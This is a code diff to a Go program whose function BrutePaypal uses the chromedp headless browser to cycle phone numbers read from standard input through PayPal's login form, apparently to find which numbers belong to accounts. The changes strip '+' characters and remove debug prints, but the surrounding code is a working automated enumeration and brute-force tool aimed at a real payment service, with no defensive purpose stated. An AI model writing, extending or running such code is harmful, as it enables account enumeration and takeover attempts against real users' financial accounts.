@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/chromedp/chromedp"
@@ -16,7 +17,7 @@ func BrutePaypal() {
 	payloads := []string{}
 	scanner := bufio.NewScanner(os.Stdin)
 	for scanner.Scan() {
-		payloads = append(payloads, scanner.Text())
+		payloads = append(payloads, strings.Replace(scanner.Text(), "+", "", -1))
 	}
 
 	if err := scanner.Err(); err != nil {
@@ -51,9 +52,7 @@ func BrutePaypal() {
 		isRestart := ""
 		PhoneNumber := payloads[indexPayload]
 		fmt.Println("Trying Phone Number:", PhoneNumber)
-		fmt.Println("9")
 		if errorUser != "" || firsAcess {
-			fmt.Println("7")
 			err := chromedp.Run(ctx,
 				chromedp.WaitVisible(`#email`, chromedp.ByID),
 				chromedp.Sleep(1*time.Second),
@@ -68,9 +67,7 @@ func BrutePaypal() {
 			if err != nil {
 				log.Fatal(err)
 			}
-			fmt.Println("0")
 		} else {
-			fmt.Println("1")
 			err := chromedp.Run(ctx,
 				chromedp.WaitReady(`#backToInputEmailLink`, chromedp.ByID),
 				chromedp.Evaluate(`document.querySelector("#backToInputEmailLink").parentElement.className.includes("hide")?"":"visible"`, &isRestart),
@@ -78,9 +75,7 @@ func BrutePaypal() {
 			if err != nil {
 				log.Fatal(err)
 			}
-			fmt.Println("2")
 			if isRestart == "visible" {
-				fmt.Println("4")
 				err = chromedp.Run(ctx,
 					chromedp.WaitVisible(`#backToInputEmailLink`, chromedp.ByID),
 					chromedp.Evaluate(`document.getElementById("backToInputEmailLink").click()`, nil),
@@ -95,9 +90,7 @@ func BrutePaypal() {
 				if err != nil {
 					log.Fatal(err)
 				}
-				fmt.Println("3")
 			} else {
-				fmt.Println("5")
 				err := chromedp.Run(ctx,
 					chromedp.WaitVisible(`#email`, chromedp.ByID),
 					chromedp.Sleep(1*time.Second),
@@ -108,8 +101,6 @@ func BrutePaypal() {
 				if err != nil {
 					log.Fatal(err)
 				}
-				fmt.Println("5-1")
-				fmt.Println("6")
 			}
 		}
 		if errorUser != "" {
